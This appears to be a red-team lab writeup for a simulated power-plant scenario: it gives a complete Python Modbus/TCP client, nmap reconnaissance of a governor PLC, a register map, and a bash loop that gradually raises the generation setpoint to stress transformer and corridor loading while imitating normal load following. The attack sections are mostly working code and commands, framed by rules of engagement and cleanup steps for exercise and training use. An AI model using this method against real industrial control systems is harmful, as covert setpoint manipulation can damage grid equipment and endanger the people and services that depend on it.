# Red Team Writeup — Scenario 2: Silent Generation Bias

## 1. Mission

Assess whether the Unit-2 governor control path can be misused to create a sustained operational effect while keeping the PLC, operator console and process simulator available. The intended effect is a gradual generation bias that reduces transformer and corridor operating margin without indiscriminate disruption.

## 2. Starting information

Red participants should receive only:

- the Scenario 2 target IP or routed target segment;
- the campaign context from Scenario 1;
- the asset identifier `PU-GOV-PLC-02`;
- the rule that destructive denial of service is prohibited.

Do not provide credentials, register addresses, the success threshold or the process model.

## 3. Scenario 1 handoff

Scenario 1 establishes that Prabal Urja Unit-2 has a downstream governor controller using Modbus/TCP. This gives Red a justified target relationship, not an immediate exploit recipe. Confirm the service independently.

Set the target:

```bash
export TARGET=<SCENARIO_2_IP>
```

## 4. Reconnaissance

Perform a narrow OT-focused scan:

```bash
sudo nmap -Pn -sS -sV --version-all -p 502,8090 "$TARGET"
```

Expected discoveries:

- TCP 502 accepts Modbus/TCP;
- TCP 8090 provides the Unit-2 operations console;
- the OpenPLC engineering interface on TCP 8080 should not be remotely reachable.

Confirm the Modbus Application Protocol header and unit response without flooding:

```bash
sudo nmap -Pn -p 502 --script modbus-discover "$TARGET"
```

Open the operations console in a browser:

```text
http://<SCENARIO_2_IP>:8090/
```

Record the baseline values for setpoint, actual generation, transformer loading, corridor loading, winding temperature and command sequence.

## 5. Create a controlled Modbus helper

Use this small client on the Red workstation. It supports holding-register reads and single-register writes and generates standard Modbus/TCP frames.

```bash
cat > /tmp/prabal_modbus.py <<'PY'
#!/usr/bin/env python3
import argparse, socket, struct, sys

def recv_exact(sock, n):
    data=b''
    while len(data)<n:
        part=sock.recv(n-len(data))
        if not part: raise RuntimeError('connection closed')
        data+=part
    return data

def request(host, port, unit, pdu, tid=1):
    frame=struct.pack('>HHHB',tid,0,len(pdu)+1,unit)+pdu
    with socket.create_connection((host,port),timeout=3) as s:
        s.sendall(frame)
        h=recv_exact(s,7)
        rtid,proto,length,runit=struct.unpack('>HHHB',h)
        body=recv_exact(s,length-1)
    if (rtid,proto,runit)!=(tid,0,unit): raise RuntimeError('invalid MBAP')
    if body[0]&0x80: raise RuntimeError(f'Modbus exception {body.hex()}')
    return body

def read(host,port,unit,address,count):
    body=request(host,port,unit,struct.pack('>BHH',3,address,count))
    if body[0]!=3: raise RuntimeError('unexpected function')
    vals=struct.unpack('>'+'H'*count,body[2:])
    for i,v in enumerate(vals): print(f'{address+i}: {v}')

def write(host,port,unit,address,value):
    pdu=struct.pack('>BHH',6,address,value&0xffff)
    body=request(host,port,unit,pdu)
    if body!=pdu: raise RuntimeError('write verification failed')
    print(f'WRITE_OK address={address} value={value&0xffff}')

p=argparse.ArgumentParser();p.add_argument('host');p.add_argument('action',choices=['read','write'])
p.add_argument('address',type=int);p.add_argument('value',type=int);p.add_argument('--port',type=int,default=502);p.add_argument('--unit',type=int,default=1)
a=p.parse_args()
if a.action=='read': read(a.host,a.port,a.unit,a.address,a.value)
else: write(a.host,a.port,a.unit,a.address,a.value)
PY
chmod +x /tmp/prabal_modbus.py
```

## 6. Discover the meaningful memory region

OpenPLC maps its general 16-bit `%MW` memory to holding registers beginning at address 1024. Test a small range instead of sweeping the entire address space:

```bash
python3 /tmp/prabal_modbus.py "$TARGET" read 1024 32
```

Repeat after 10–15 seconds:

```bash
python3 /tmp/prabal_modbus.py "$TARGET" read 1024 32
```

Interpret the pattern:

- the first group contains stable or operator-controlled command values;
- a later group changes continuously and represents process feedback;
- one changing register behaves as a heartbeat;
- values around 650 are plausible generation quantities;
- values around 700–900 may be scaled percentages or temperatures.

Correlate the register values with the operator console rather than guessing blindly.

## 7. Confirm command and feedback registers

Read the command block:

```bash
python3 /tmp/prabal_modbus.py "$TARGET" read 1024 6
```

Typical baseline:

```text
1024: 650    generation setpoint in MW
1025: 10     ramp rate, scaled by 0.1 MW/s
1026: 1      automatic governor mode
1027: 0      maintenance override disabled
1028: 100    cooling demand percentage
1029: 100    command sequence
```

Read feedback:

```bash
python3 /tmp/prabal_modbus.py "$TARGET" read 1040 8
```

Interpretation:

```text
1040 actual generation MW
1041 generator-transformer loading, tenths of percent
1042 northern-corridor loading, tenths of percent
1043 unit-bus voltage, hundredths of kV
1044 winding temperature, tenths of degrees Celsius
1045 grid-risk state: 0 normal, 1 stressed, 2 critical
1046 command-sequence echo
1047 simulator heartbeat
```

## 8. Validate that writes are accepted

Do not begin with a large change. First make a small reversible setpoint change:

```bash
python3 /tmp/prabal_modbus.py "$TARGET" write 1024 655
python3 /tmp/prabal_modbus.py "$TARGET" write 1029 101
sleep 8
python3 /tmp/prabal_modbus.py "$TARGET" read 1024 6
python3 /tmp/prabal_modbus.py "$TARGET" read 1040 8
```

A successful result shows the command register changed and actual generation is moving toward the new setpoint.

## 9. Execute the controlled generation bias

The preferred live-fire technique is a gradual change that resembles legitimate load following. Keep the ramp rate unchanged and advance the command sequence with each dispatch step.

```bash
SEQ=102
for MW in 670 685 700 715 725; do
  python3 /tmp/prabal_modbus.py "$TARGET" write 1024 "$MW"
  python3 /tmp/prabal_modbus.py "$TARGET" write 1029 "$SEQ"
  echo "Requested ${MW} MW with sequence ${SEQ}"
  SEQ=$((SEQ+1))
  sleep 18
done
```

Monitor process feedback:

```bash
watch -n 3 "python3 /tmp/prabal_modbus.py '$TARGET' read 1040 8"
```

Successful operational impact is reached when:

- setpoint is at or above 720 MW;
- actual generation has risen substantially toward the setpoint;
- transformer or corridor loading has entered the stressed region;
- services remain available;
- no indiscriminate network flood or process crash occurred.

The operator console should show reduced operating margin. Static protection thresholds may remain below a trip condition, which is central to the scenario.

## 10. Campaign transition discovery

Query the operator coordination endpoint:

```bash
curl -s "http://$TARGET:8090/api/intertie" | python3 -m json.tool
```

This identifies `PU-RB-RTU-07` at River Bend Remote Substation as the feeder and bus-tie switching dependency. That relationship justifies the Scenario 3 transition. Do not attempt DNP3 activity until Scenario 3 is deployed and authorised.

## 11. Evidence to retain

Capture:

```bash
mkdir -p red-evidence-s02
nmap -Pn -sV -p 502,8090 "$TARGET" -oA red-evidence-s02/service-scan
python3 /tmp/prabal_modbus.py "$TARGET" read 1024 24 | tee red-evidence-s02/final-registers.txt
curl -s "http://$TARGET:8090/api/live" | tee red-evidence-s02/final-process-state.json
curl -s "http://$TARGET:8090/api/intertie" | tee red-evidence-s02/intertie-discovery.json
```

Record exact UTC timestamps for every write so Blue evidence can be correlated.

## 12. Cleanup and restoration

Return the controller to the approved baseline:

```bash
python3 /tmp/prabal_modbus.py "$TARGET" write 1024 650
python3 /tmp/prabal_modbus.py "$TARGET" write 1025 10
python3 /tmp/prabal_modbus.py "$TARGET" write 1026 1
python3 /tmp/prabal_modbus.py "$TARGET" write 1027 0
python3 /tmp/prabal_modbus.py "$TARGET" write 1028 100
python3 /tmp/prabal_modbus.py "$TARGET" write 1029 200
```

Verify recovery:

```bash
watch -n 3 "python3 /tmp/prabal_modbus.py '$TARGET' read 1040 8"
```

Stop after actual generation returns near 650 MW and risk state returns to 0.

## 13. MITRE ATT&CK for ICS mapping

- T0836 — Modify Parameter
- T0831 — Manipulation of Control
- T1692.001 — Unauthorized Message: Command Message
- T0846.001 — Remote System Discovery: Port Scan

## 14. Rules of engagement reminders

Do not:

- flood TCP 502;
- stop or crash OpenPLC;
- alter the operating system;
- attack the loopback-only OpenPLC engineering interface;
- write arbitrary values to the feedback register block;
- exceed the defined 750 MW engineering limit;
- pivot to Scenario 3 before authorisation.
